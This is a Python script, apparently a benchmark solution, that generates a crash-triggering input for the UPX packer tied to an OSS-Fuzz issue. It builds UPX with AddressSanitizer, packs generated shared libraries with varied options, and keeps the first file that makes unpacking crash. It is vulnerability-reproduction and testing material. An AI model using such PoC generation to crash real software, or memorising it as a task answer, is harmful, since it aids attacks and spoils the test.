import os
import re
import io
import sys
import time
import stat
import shutil
import tarfile
import tempfile
import subprocess
import hashlib
from typing import Optional, List, Tuple


def _is_exe(path: str) -> bool:
    try:
        st = os.stat(path)
        return stat.S_ISREG(st.st_mode) and (st.st_mode & 0o111) != 0
    except OSError:
        return False


def _safe_extract_tar(tar: tarfile.TarFile, path: str) -> None:
    base = os.path.realpath(path)
    for m in tar.getmembers():
        name = m.name
        if not name:
            continue
        dest = os.path.realpath(os.path.join(path, name))
        if not (dest == base or dest.startswith(base + os.sep)):
            continue
        try:
            tar.extract(m, path=path)
        except Exception:
            pass


def _maybe_extract(src_path: str, dst_dir: str) -> str:
    if os.path.isdir(src_path):
        return os.path.realpath(src_path)
    with tarfile.open(src_path, mode="r:*") as tar:
        _safe_extract_tar(tar, dst_dir)
    items = [os.path.join(dst_dir, x) for x in os.listdir(dst_dir)]
    dirs = [p for p in items if os.path.isdir(p)]
    files = [p for p in items if os.path.isfile(p)]
    if len(dirs) == 1 and not files:
        return os.path.realpath(dirs[0])
    return os.path.realpath(dst_dir)


def _find_project_root(extracted_root: str) -> str:
    cmake = os.path.join(extracted_root, "CMakeLists.txt")
    if os.path.isfile(cmake):
        return extracted_root

    best = None
    best_score = -1
    for cur, dirs, files in os.walk(extracted_root):
        if "CMakeLists.txt" in files:
            p = os.path.join(cur, "CMakeLists.txt")
            try:
                data = open(p, "rb").read(200000)
            except Exception:
                continue
            score = 0
            if b"project" in data.lower():
                score += 1
            if b"upx" in data.lower():
                score += 3
            if b"add_executable" in data.lower():
                score += 1
            if score > best_score:
                best_score = score
                best = cur
        if cur.count(os.sep) - extracted_root.count(os.sep) > 6:
            dirs[:] = []
    return best if best is not None else extracted_root


def _run(cmd: List[str], cwd: Optional[str] = None, env: Optional[dict] = None, timeout: int = 120) -> subprocess.CompletedProcess:
    return subprocess.run(
        cmd,
        cwd=cwd,
        env=env,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        timeout=timeout,
        check=False,
    )


def _find_file_candidates(root: str) -> List[str]:
    cands = []
    for cur, dirs, files in os.walk(root):
        low = cur.lower()
        if any(x in low for x in (".git", "build", "cmake-build", "__pycache__", "node_modules")):
            continue
        for f in files:
            p = os.path.join(cur, f)
            try:
                st = os.stat(p)
            except OSError:
                continue
            if st.st_size <= 0 or st.st_size > 5_000_000:
                continue
            ext = os.path.splitext(f)[1].lower()
            if ext in (".bin", ".dat", ".poc", ".repro", ".crash", ".elf", ".so", ".exe", ".upx", ".packed", ".input"):
                cands.append(p)
                continue
            if st.st_size in (512, 1024, 2048, 4096):
                cands.append(p)
                continue
            if any(x in f.lower() for x in ("poc", "repro", "crash", "ossfuzz", "fuzz", "corpus")):
                cands.append(p)
    return cands


def _choose_best_candidate(paths: List[str]) -> Optional[bytes]:
    best = None
    best_score = -10**18
    for p in paths:
        try:
            b = open(p, "rb").read()
        except Exception:
            continue
        if not b:
            continue
        size = len(b)
        has_elf = b.startswith(b"\x7fELF")
        has_upx = b"UPX!" in b or b"UPX0" in b or b"UPX1" in b
        score = 0
        if has_elf:
            score += 1000
        if has_upx:
            score += 1200
        if size == 512:
            score += 800
        score -= abs(size - 512)
        if has_elf and has_upx:
            score += 500
        if score > best_score:
            best_score = score
            best = b
    return best


def _det_bytes(n: int, seed: bytes) -> bytes:
    out = bytearray()
    ctr = 0
    while len(out) < n:
        h = hashlib.sha256(seed + ctr.to_bytes(8, "little")).digest()
        out += h
        ctr += 1
    return bytes(out[:n])


def _build_upx(project_root: str, build_root: str, deadline: float) -> Optional[str]:
    cmake_path = shutil.which("cmake")
    if not cmake_path:
        return None
    os.makedirs(build_root, exist_ok=True)

    common_env = os.environ.copy()
    common_env.setdefault("ASAN_OPTIONS", "detect_leaks=0:abort_on_error=1:halt_on_error=1:symbolize=0")
    common_env.setdefault("UBSAN_OPTIONS", "halt_on_error=1:abort_on_error=1:symbolize=0")

    cflags = "-O1 -g -fno-omit-frame-pointer -fsanitize=address"
    cxxflags = cflags
    ldflags = "-fsanitize=address"

    cfg_cmd = [
        cmake_path,
        "-S",
        project_root,
        "-B",
        build_root,
        "-DCMAKE_BUILD_TYPE=RelWithDebInfo",
        f"-DCMAKE_C_FLAGS={cflags}",
        f"-DCMAKE_CXX_FLAGS={cxxflags}",
        f"-DCMAKE_EXE_LINKER_FLAGS={ldflags}",
        f"-DCMAKE_SHARED_LINKER_FLAGS={ldflags}",
    ]

    remaining = max(10, int(deadline - time.time()))
    if remaining < 10:
        return None
    r = _run(cfg_cmd, cwd=project_root, env=common_env, timeout=min(remaining, 120))
    if r.returncode != 0:
        cfg_cmd = [
            cmake_path,
            "-S",
            project_root,
            "-B",
            build_root,
            "-DCMAKE_BUILD_TYPE=Release",
        ]
        remaining = max(10, int(deadline - time.time()))
        if remaining < 10:
            return None
        r = _run(cfg_cmd, cwd=project_root, env=common_env, timeout=min(remaining, 120))
        if r.returncode != 0:
            return None

    remaining = max(10, int(deadline - time.time()))
    if remaining < 10:
        return None
    b = _run([cmake_path, "--build", build_root, "-j", str(min(8, os.cpu_count() or 2))], cwd=project_root, env=common_env, timeout=min(remaining, 240))
    if b.returncode != 0:
        return None

    upx_bin = None
    for cand in (
        os.path.join(build_root, "upx"),
        os.path.join(build_root, "src", "upx"),
        os.path.join(build_root, "bin", "upx"),
    ):
        if _is_exe(cand):
            upx_bin = cand
            break
    if upx_bin is None:
        for cur, dirs, files in os.walk(build_root):
            for f in files:
                if f == "upx":
                    p = os.path.join(cur, f)
                    if _is_exe(p):
                        upx_bin = p
                        break
            if upx_bin is not None:
                break
    return upx_bin


def _build_shared_lib(work: str, blob: bytes) -> Optional[str]:
    gcc = shutil.which("gcc") or shutil.which("cc")
    ld = shutil.which("ld")
    if not gcc or not ld:
        return None

    blob_path = os.path.join(work, "blob.bin")
    with open(blob_path, "wb") as f:
        f.write(blob)

    blob_obj = os.path.join(work, "blob.o")
    r = _run([ld, "-r", "-b", "binary", "-o", blob_obj, blob_path], cwd=work, timeout=60)
    if r.returncode != 0 or not os.path.isfile(blob_obj):
        return None

    c_path = os.path.join(work, "poc.c")
    c_code = r"""
#include <stddef.h>
#include <stdint.h>

extern const unsigned char _binary_blob_bin_start[];
extern const unsigned char _binary_blob_bin_end[];

__attribute__((constructor))
static void initfunc(void) {
    volatile uint32_t x = 0;
    x += 1;
}

__attribute__((visibility("default")))
int foo(void) {
    size_t n = (size_t)(_binary_blob_bin_end - _binary_blob_bin_start);
    volatile unsigned char v = 0;
    if (n) v = _binary_blob_bin_start[n/2];
    return (int)v;
}
"""
    with open(c_path, "w", encoding="utf-8") as f:
        f.write(c_code)

    so_path = os.path.join(work, "libpoc.so")
    cmd = [
        gcc,
        "-shared",
        "-fPIC",
        "-Os",
        "-fno-omit-frame-pointer",
        "-ffunction-sections",
        "-fdata-sections",
        "-Wl,--gc-sections",
        "-Wl,--build-id=none",
        "-Wl,-z,relro",
        "-Wl,-z,now",
        "-s",
        c_path,
        blob_obj,
        "-o",
        so_path,
    ]
    r = _run(cmd, cwd=work, timeout=60)
    if r.returncode != 0 or not os.path.isfile(so_path):
        return None
    return so_path


def _pack_with_upx(upx_bin: str, work: str, so_path: str, extra_opts: List[str], deadline: float) -> Optional[str]:
    packed = os.path.join(work, "packed.so")
    env = os.environ.copy()
    env.setdefault("ASAN_OPTIONS", "detect_leaks=0:abort_on_error=1:halt_on_error=1:symbolize=0")
    env.setdefault("UBSAN_OPTIONS", "halt_on_error=1:abort_on_error=1:symbolize=0")

    cmd = [upx_bin, "-q", "--force"] + extra_opts + ["-o", packed, so_path]
    remaining = max(5, int(deadline - time.time()))
    if remaining < 5:
        return None
    r = _run(cmd, cwd=work, env=env, timeout=min(remaining, 120))
    if r.returncode != 0 or not os.path.isfile(packed):
        cmd2 = [upx_bin, "-q", "--force"] + extra_opts + [so_path, "-o", packed]
        remaining = max(5, int(deadline - time.time()))
        if remaining < 5:
            return None
        r2 = _run(cmd2, cwd=work, env=env, timeout=min(remaining, 120))
        if r2.returncode != 0 or not os.path.isfile(packed):
            return None
    return packed


def _test_upx_unpack(upx_bin: str, work: str, packed_path: str, deadline: float) -> Tuple[bool, str]:
    env = os.environ.copy()
    env.setdefault("ASAN_OPTIONS", "detect_leaks=0:abort_on_error=1:halt_on_error=1:symbolize=0")
    env.setdefault("UBSAN_OPTIONS", "halt_on_error=1:abort_on_error=1:symbolize=0")

    cmd = [upx_bin, "-q", "-t", packed_path]
    remaining = max(5, int(deadline - time.time()))
    if remaining < 5:
        return (False, "timeout")
    r = _run(cmd, cwd=work, env=env, timeout=min(remaining, 60))
    out = (r.stdout or b"") + b"\n" + (r.stderr or b"")
    s = out.decode("utf-8", errors="ignore")
    crashed = False
    if r.returncode < 0:
        crashed = True
    if "AddressSanitizer" in s or "heap-buffer-overflow" in s or "ERROR: " in s and "Sanitizer" in s:
        crashed = True
    return (crashed, s)


class Solution:
    _cache: Optional[bytes] = None

    def solve(self, src_path: str) -> bytes:
        if Solution._cache is not None:
            return Solution._cache

        start = time.time()
        deadline = start + 110.0

        with tempfile.TemporaryDirectory(prefix="pocgen_") as td:
            extracted = _maybe_extract(src_path, os.path.join(td, "src"))
            project_root = _find_project_root(extracted)

            cands = _find_file_candidates(extracted)
            best = _choose_best_candidate(cands)
            if best is not None and (best.startswith(b"\x7fELF") or b"UPX!" in best) and len(best) <= 2_000_000:
                Solution._cache = best
                return best

            build_dir = os.path.join(td, "build")
            upx_bin = _build_upx(project_root, build_dir, deadline)
            if upx_bin is None:
                upx_sys = shutil.which("upx")
                if upx_sys and _is_exe(upx_sys):
                    upx_bin = upx_sys

            if upx_bin is None:
                fallback = b"\x7fELF" + b"\x02\x01\x01" + b"\x00" * (512 - 7)
                Solution._cache = fallback
                return fallback

            patterns = [
                (0x4000, 0x4000, 0x4000),
                (0x8000, 0x8000, 0x8000),
                (0x10000, 0x10000, 0x10000),
                (0x8000, 0x10000, 0x8000),
                (0x10000, 0x20000, 0x10000),
                (0x20000, 0x10000, 0x20000),
            ]
            opts_list = [
                ["--best"],
                ["--best", "--nrv2b"],
                ["--best", "--nrv2d"],
                ["--best", "--nrv2e"],
            ]

            attempt = 0
            last_good: Optional[bytes] = None

            for (z1, r1, z2) in patterns:
                for extra in opts_list:
                    if time.time() > deadline - 5:
                        break
                    work = os.path.join(td, f"work_{attempt}")
                    os.makedirs(work, exist_ok=True)

                    seed = (f"oss-fuzz:383200048:{attempt}:{z1}:{r1}:{z2}").encode("utf-8")
                    blob = (b"\x00" * z1) + _det_bytes(r1, seed) + (b"\x00" * z2)

                    so = _build_shared_lib(work, blob)
                    if so is None:
                        attempt += 1
                        continue

                    packed = _pack_with_upx(upx_bin, work, so, extra, deadline)
                    if packed is None:
                        attempt += 1
                        continue

                    try:
                        pb = open(packed, "rb").read()
                    except Exception:
                        attempt += 1
                        continue

                    if last_good is None and pb:
                        last_good = pb

                    crashed, _log = _test_upx_unpack(upx_bin, work, packed, deadline)
                    if crashed and pb:
                        Solution._cache = pb
                        return pb

                    attempt += 1

            if last_good is not None:
                Solution._cache = last_good
                return last_good

            fallback = b"\x7fELF" + b"\x02\x01\x01" + b"\x00" * (512 - 7)
            Solution._cache = fallback
            return fallback